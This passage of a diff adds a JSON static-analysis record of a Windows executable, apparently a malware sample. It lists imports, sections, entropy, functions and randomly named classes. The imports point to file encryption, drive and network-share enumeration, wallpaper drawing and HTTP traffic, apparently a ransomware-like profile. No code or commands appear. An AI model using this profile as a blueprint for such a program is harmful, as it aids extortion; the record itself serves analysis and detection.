+          "name": "FindHandlerForForeignException",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 61391,
+          "name": "FindHandler",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 62305,
+          "name": "___InternalCxxFrameHandler",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 62544,
+          "name": "__CallSettingFrame@12",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 62620,
+          "name": "__EH_prolog3_catch",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 65166,
+          "name": "??__FTimer@fuzzer@@YAXXZ",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 66560,
+          "name": "advapi32.CryptCreateHash",
+          "type": "IMPORT",
+          "num_refs": 7
+        },
+        {
+          "ea": 66564,
+          "name": "advapi32.AccessCheck",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66568,
+          "name": "advapi32.MapGenericMask",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66572,
+          "name": "advapi32.DuplicateToken",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66576,
+          "name": "advapi32.OpenThreadToken",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66580,
+          "name": "advapi32.GetFileSecurityW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66584,
+          "name": "advapi32.CryptHashData",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66588,
+          "name": "advapi32.SetTokenInformation",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66592,
+          "name": "advapi32.OpenProcessToken",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66596,
+          "name": "advapi32.CryptDestroyHash",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 66600,
+          "name": "advapi32.CryptGetHashParam",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66604,
+          "name": "advapi32.RegSetValueExW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66608,
+          "name": "advapi32.RegQueryValueExA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66612,
+          "name": "advapi32.RegDeleteValueA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66616,
+          "name": "advapi32.RegSetValueExA",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 66620,
+          "name": "advapi32.RegCreateKeyExA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66624,
+          "name": "advapi32.RegCloseKey",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 66628,
+          "name": "advapi32.RegOpenKeyExA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66632,
+          "name": "advapi32.CryptAcquireContextA",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66636,
+          "name": "advapi32.CryptGenRandom",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66640,
+          "name": "advapi32.CryptReleaseContext",
+          "type": "IMPORT",
+          "num_refs": 9
+        },
+        {
+          "ea": 66644,
+          "name": "advapi32.CryptEncrypt",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66648,
+          "name": "advapi32.CryptSetKeyParam",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66652,
+          "name": "advapi32.CryptImportKey",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66656,
+          "name": "advapi32.CryptDestroyKey",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 66664,
+          "name": "gdi32.CreateSolidBrush",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66668,
+          "name": "gdi32.GetDIBits",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66672,
+          "name": "gdi32.GetObjectA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66676,
+          "name": "gdi32.SetBkMode",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66680,
+          "name": "gdi32.SetTextColor",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66684,
+          "name": "gdi32.CreateCompatibleBitmap",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66688,
+          "name": "gdi32.SelectObject",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66692,
+          "name": "gdi32.CreateFontA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66696,
+          "name": "gdi32.DeleteObject",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 66700,
+          "name": "gdi32.GetDeviceCaps",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66704,
+          "name": "gdi32.CreateCompatibleDC",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66708,
+          "name": "gdi32.DeleteDC",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66716,
+          "name": "kernel32.EnterCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 66720,
+          "name": "kernel32.LeaveCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 66724,
+          "name": "kernel32.GetCurrentThread",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66728,
+          "name": "kernel32.FindNextFileW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66732,
+          "name": "kernel32.GetDiskFreeSpaceExW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66736,
+          "name": "kernel32.GetVolumeInformationW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66740,
+          "name": "kernel32.GetLogicalDrives",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66744,
+          "name": "kernel32.GetDriveTypeW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66748,
+          "name": "kernel32.DeleteCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66752,
+          "name": "kernel32.LoadLibraryW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66756,
+          "name": "kernel32.RtlUnwind",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66760,
+          "name": "kernel32.InitializeCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66764,
+          "name": "kernel32.GetSystemTime",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66768,
+          "name": "kernel32.GetTempFileNameW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66772,
+          "name": "kernel32.CreateProcessW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66776,
+          "name": "kernel32.GetModuleHandleA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66780,
+          "name": "kernel32.GetProcAddress",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 66784,
+          "name": "kernel32.GetCurrentProcess",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 66788,
+          "name": "kernel32.FindFirstFileW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66792,
+          "name": "kernel32.GetVolumeNameForVolumeMountPointA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66796,
+          "name": "kernel32.GetWindowsDirectoryA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66800,
+          "name": "kernel32.GetLocaleInfoA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66804,
+          "name": "kernel32.FindClose",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66808,
+          "name": "kernel32.MultiByteToWideChar",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66812,
+          "name": "kernel32.WideCharToMultiByte",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66816,
+          "name": "kernel32.WaitForSingleObject",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66820,
+          "name": "kernel32.CreateThread",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66824,
+          "name": "kernel32.CopyFileW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66828,
+          "name": "kernel32.GetTempPathW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66832,
+          "name": "kernel32.Sleep",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 66836,
+          "name": "kernel32.GetUserDefaultUILanguage",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66840,
+          "name": "kernel32.GetUserDefaultLangID",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66844,
+          "name": "kernel32.GetSystemDefaultLangID",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66848,
+          "name": "kernel32.SetUnhandledExceptionFilter",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 66852,
+          "name": "kernel32.SetErrorMode",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66856,
+          "name": "kernel32.MulDiv",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66860,
+          "name": "kernel32.GetVersionExA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66864,
+          "name": "kernel32.ExitProcess",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66868,
+          "name": "kernel32.GetModuleFileNameW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66872,
+          "name": "kernel32.GetLastError",
+          "type": "IMPORT",
+          "num_refs": 49
+        },
+        {
+          "ea": 66876,
+          "name": "kernel32.FlushFileBuffers",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66880,
+          "name": "kernel32.SetFileTime",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66884,
+          "name": "kernel32.GetSystemTimeAsFileTime",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66888,
+          "name": "kernel32.SetFilePointer",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66892,
+          "name": "kernel32.ReadFile",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66896,
+          "name": "kernel32.SetFileAttributesW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66900,
+          "name": "kernel32.GetFileAttributesExW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66904,
+          "name": "kernel32.DeleteFileW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66908,
+          "name": "kernel32.MoveFileExW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66912,
+          "name": "kernel32.WriteFile",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66916,
+          "name": "kernel32.GetFileSizeEx",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66920,
+          "name": "kernel32.CreateFileW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66924,
+          "name": "kernel32.CloseHandle",
+          "type": "IMPORT",
+          "num_refs": 16
+        },
+        {
+          "ea": 66928,
+          "name": "kernel32.GetCurrentProcessId",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66932,
+          "name": "kernel32.GetTickCount",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66936,
+          "name": "kernel32.QueryPerformanceCounter",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66940,
+          "name": "kernel32.GetFileType",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66944,
+          "name": "kernel32.InitializeCriticalSectionAndSpinCount",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 66948,
+          "name": "kernel32.SetHandleCount",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66952,
+          "name": "kernel32.GetEnvironmentStringsW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66956,
+          "name": "kernel32.FreeEnvironmentStringsW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66960,
+          "name": "kernel32.GetModuleFileNameA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66964,
+          "name": "kernel32.GetStringTypeW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66968,
+          "name": "kernel32.LCMapStringW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66972,
+          "name": "kernel32.HeapCreate",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66976,
+          "name": "kernel32.GetCurrentThreadId",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 66980,
+          "name": "kernel32.SetLastError",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 66984,
+          "name": "kernel32.TlsFree",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66988,
+          "name": "kernel32.TlsSetValue",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66992,
+          "name": "kernel32.TlsGetValue",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 66996,
+          "name": "kernel32.TlsAlloc",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67000,
+          "name": "kernel32.IsValidCodePage",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67004,
+          "name": "kernel32.GetOEMCP",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67008,
+          "name": "kernel32.GetACP",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67012,
+          "name": "kernel32.InterlockedDecrement",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 67016,
+          "name": "kernel32.InterlockedIncrement",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 67020,
+          "name": "kernel32.GetCPInfo",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67024,
+          "name": "kernel32.HeapAlloc",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67028,
+          "name": "kernel32.HeapFree",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67032,
+          "name": "kernel32.GetCommandLineA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67036,
+          "name": "kernel32.HeapSetInformation",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67040,
+          "name": "kernel32.GetStartupInfoW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67044,
+          "name": "kernel32.RaiseException",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67048,
+          "name": "kernel32.GetStdHandle",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67052,
+          "name": "kernel32.UnhandledExceptionFilter",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67056,
+          "name": "kernel32.IsDebuggerPresent",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67060,
+          "name": "kernel32.TerminateProcess",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67064,
+          "name": "kernel32.HeapSize",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67068,
+          "name": "kernel32.HeapReAlloc",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67072,
+          "name": "kernel32.IsProcessorFeaturePresent",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67076,
+          "name": "kernel32.GetModuleHandleW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 67084,
+          "name": "mpr.WNetEnumResourceW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 67088,
+          "name": "mpr.WNetCloseEnum",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67092,
+          "name": "mpr.WNetAddConnection2W",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67096,
+          "name": "mpr.WNetOpenEnumW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67104,
+          "name": "netapi32.DsRoleGetPrimaryDomainInformation",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67108,
+          "name": "netapi32.DsRoleFreeMemory",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67116,
+          "name": "shell32.SHGetFolderPathW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67120,
+          "name": "shell32.ShellExecuteW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67128,
+          "name": "user32.DrawTextW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67132,
+          "name": "user32.SystemParametersInfoW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67136,
+          "name": "user32.ReleaseDC",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67140,
+          "name": "user32.FrameRect",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67144,
+          "name": "user32.FillRect",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67148,
+          "name": "user32.GetSystemMetrics",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67152,
+          "name": "user32.GetDC",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67160,
+          "name": "wininet.InternetOpenA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67164,
+          "name": "wininet.InternetCloseHandle",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 67168,
+          "name": "wininet.InternetSetOptionA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67172,
+          "name": "wininet.HttpOpenRequestA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67176,
+          "name": "wininet.InternetQueryOptionA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67180,
+          "name": "wininet.HttpSendRequestExA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67184,
+          "name": "wininet.InternetWriteFile",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67188,
+          "name": "wininet.HttpEndRequestA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67192,
+          "name": "wininet.HttpSendRequestA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67196,
+          "name": "wininet.HttpQueryInfoA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 67200,
+          "name": "wininet.InternetCrackUrlA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67204,
+          "name": "wininet.InternetReadFile",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67208,
+          "name": "wininet.InternetConnectA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 67344,
+          "name": "eoqelfrpnxso.Vtable",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 67356,
+          "name": "lrybg.Vtable",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 67368,
+          "name": "rebixaldhajxr.Vtable",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 67380,
+          "name": "ylkuqdbg.Vtable",
+          "type": "TYPE",
+          "num_refs": 16
+        },
+        {
+          "ea": 67388,
+          "name": "uhqirfiliupnl.Vtable",
+          "type": "TYPE",
+          "num_refs": 5
+        },
+        {
+          "ea": 67420,
+          "name": "pylqeirxupohx.Vtable",
+          "type": "TYPE",
+          "num_refs": 7
+        },
+        {
+          "ea": 75284,
+          "name": "fmiussy.Vtable",
+          "type": "TYPE",
+          "num_refs": 4
+        },
+        {
+          "ea": 75308,
+          "name": "wesioyitxu.Vtable",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 75332,
+          "name": "livsx.Vtable",
+          "type": "TYPE",
+          "num_refs": 41
+        },
+        {
+          "ea": 75340,
+          "name": "xwnmqigmmwptq.Vtable",
+          "type": "TYPE",
+          "num_refs": 13
+        },
+        {
+          "ea": 76960,
+          "name": "ssphl.Vtable",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 78232,
+          "name": "cuovxnupr.Vtable",
+          "type": "TYPE",
+          "num_refs": 20
+        },
+        {
+          "ea": 80820,
+          "name": "bcwq.Vtable",
+          "type": "TYPE",
+          "num_refs": 4
+        },
+        {
+          "ea": 80920,
+          "name": "eoqelfrpnxso.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 80996,
+          "name": "lrybg.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81076,
+          "name": "rebixaldhajxr.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81156,
+          "name": "ylkuqdbg.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81228,
+          "name": "uhqirfiliupnl.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81248,
+          "name": "xwnmqigmmwptq.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81324,
+          "name": "livsx.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81396,
+          "name": "wesioyitxu.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81644,
+          "name": "fmiussy.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81716,
+          "name": "pylqeirxupohx.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81844,
+          "name": "ssphl.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81920,
+          "name": "cuovxnupr.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 81996,
+          "name": "bcwq.ObjectLocator",
+          "type": "TYPE",
+          "num_refs": 1
+        },
+        {
+          "ea": 95240,
+          "name": "eoqelfrpnxso.Typedesc",
+          "type": "TYPE",
+          "num_refs": 3
+        },
+        {
+          "ea": 95272,
+          "name": "lrybg.Typedesc",
+          "type": "TYPE",
+          "num_refs": 3
+        },
+        {
+          "ea": 95304,
+          "name": "rebixaldhajxr.Typedesc",
+          "type": "TYPE",
+          "num_refs": 3
+        },
+        {
+          "ea": 95336,
+          "name": "ylkuqdbg.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98224,
+          "name": "dendi.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98256,
+          "name": "pyrkrdv.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98296,
+          "name": "wesioyitxu.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98324,
+          "name": "fmiussy.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98348,
+          "name": "livsx.Typedesc",
+          "type": "TYPE",
+          "num_refs": 9
+        },
+        {
+          "ea": 98376,
+          "name": "xwnmqigmmwptq.Typedesc",
+          "type": "TYPE",
+          "num_refs": 3
+        },
+        {
+          "ea": 98408,
+          "name": "ssphl.Typedesc",
+          "type": "TYPE",
+          "num_refs": 2
+        },
+        {
+          "ea": 98436,
+          "name": "uhqirfiliupnl.Typedesc",
+          "type": "TYPE",
+          "num_refs": 5
+        },
+        {
+          "ea": 98464,
+          "name": "pylqeirxupohx.Typedesc",
+          "type": "TYPE",
+          "num_refs": 3
+        },
+        {
+          "ea": 98492,
+          "name": "cuovxnupr.Typedesc",
+          "type": "TYPE",
+          "num_refs": 4
+        },
+        {
+          "ea": 98688,
+          "name": "bcwq.Typedesc",
+          "type": "TYPE",
+          "num_refs": 4
+        }
+      ],
+      "sections": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1024,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 44
+        },
+        {
+          "name": ".text",
+          "effective_address": 1024,
+          "physical_size": 64512,
+          "virtual_size": 65536,
+          "rights": "RX",
+          "entropy": 140
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 66560,
+          "physical_size": 26112,
+          "virtual_size": 28672,
+          "rights": "R",
+          "entropy": 70
+        },
+        {
+          "name": ".data",
+          "effective_address": 95232,
+          "physical_size": 3584,
+          "virtual_size": 8192,
+          "rights": "RW",
+          "entropy": 60
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 103424,
+          "physical_size": 9216,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 67
+        }
+      ],
+      "entropy": {
+        "file_entropy": 6.13,
+        "regions": [
+          {
+            "name": "header",
+            "entropy": 44,
+            "size": null
+          },
+          {
+            "name": ".text",
+            "entropy": 140,
+            "size": null
+          },
+          {
+            "name": ".rdata",
+            "entropy": 70,
+            "size": null
+          },
+          {
+            "name": ".data",
+            "entropy": 60,
+            "size": null
+          },
+          {
+            "name": ".reloc",
+            "entropy": 67,
+            "size": null
+          }
+        ],
+        "file_entropy_malcat_raw": 116,
+        "entropy_source": "whole_file_shannon_revai"
+      },
+      "functions": [
+        {
+          "ea": 60365,
+          "name": "sub_40f7cd"
+        },
+        {
+          "ea": 13380,
+          "name": "sub_404044"
+        },
+        {
+          "ea": 12682,
+          "name": "sub_403d8a"
+        },
+        {
+          "ea": 59760,
+          "name": "sub_40f570"
+        },
+        {
+          "ea": 1479,
+          "name": "#3"
+        },
+        {
+          "ea": 25276,
+          "name": "sub_406ebc"
+        },
+        {
+          "ea": 52135,
+          "name": "sub_40d7a7"
+        },
+        {
+          "ea": 51280,
+          "name": "sub_40d450"
+        },
+        {
+          "ea": 2873,
+          "name": "#3"
+        },
+        {
+          "ea": 57392,
+          "name": "sub_40ec30"
+        },
+        {
+          "ea": 64860,
+          "name": "sub_41095c"
+        },
+        {
+          "ea": 4218,
+          "name": "sub_401c7a"
+        },
+        {
+          "ea": 11709,
+          "name": "sub_4039bd"
+        },
+        {
+          "ea": 23628,
+          "name": "sub_40684c"
+        },
+        {
+          "ea": 28502,
+          "name": "sub_407b56"
+        },
+        {
+          "ea": 10432,
+          "name": "sub_4034c0"
+        },
+        {
+          "ea": 29717,
+          "name": "sub_408015"
+        },
+        {
+          "ea": 30161,
+          "name": "sub_4081d1"
+        },
+        {
+          "ea": 28839,
+          "name": "sub_407ca7"
+        },
+        {
+          "ea": 21348,
+          "name": "sub_405f64"
+        },
+        {
+          "ea": 1889,
+          "name": "sub_401361"
+        },
+        {
+          "ea": 9353,
+          "name": "sub_403089"
+        },
+        {
+          "ea": 21910,
+          "name": "sub_406196"
+        },
+        {
+          "ea": 1232,
+          "name": "#2"
+        },
+        {
+          "ea": 26620,
+          "name": "sub_4073fc"
+        },
+        {
+          "ea": 9118,
+          "name": "sub_402f9e"
+        },
+        {
+          "ea": 20702,
+          "name": "sub_405cde"
+        },
+        {
+          "ea": 19811,
+          "name": "sub_405963"
+        },
+        {
+          "ea": 28350,
+          "name": "sub_407abe"
+        },
+        {
+          "ea": 23166,
+          "name": "sub_40667e"
+        }
+      ],
+      "constants": [
+        {
+          "id": "registry::HKEY_CURRENT_USER",
+          "category": "registry",
+          "type": "code",
+          "num_hits": 3
+        },
+        {
+          "id": "exception::C++ exception",
+          "category": "exception",
+          "type": "code",
+          "num_hits": 9
+        },
+        {
+          "id": "exception::FuncInfo header",
+          "category": "exception",
+          "type": "code",
+          "num_hits": 19
+        },
+        {
+          "id": "exception::CLR exception",
+          "category": "exception",
+          "type": "code",
+          "num_hits": 2
+        },
+        {
+          "id": "registry::HKEY_USERS",
+          "category": "registry",
+          "type": "code",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_tloss_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
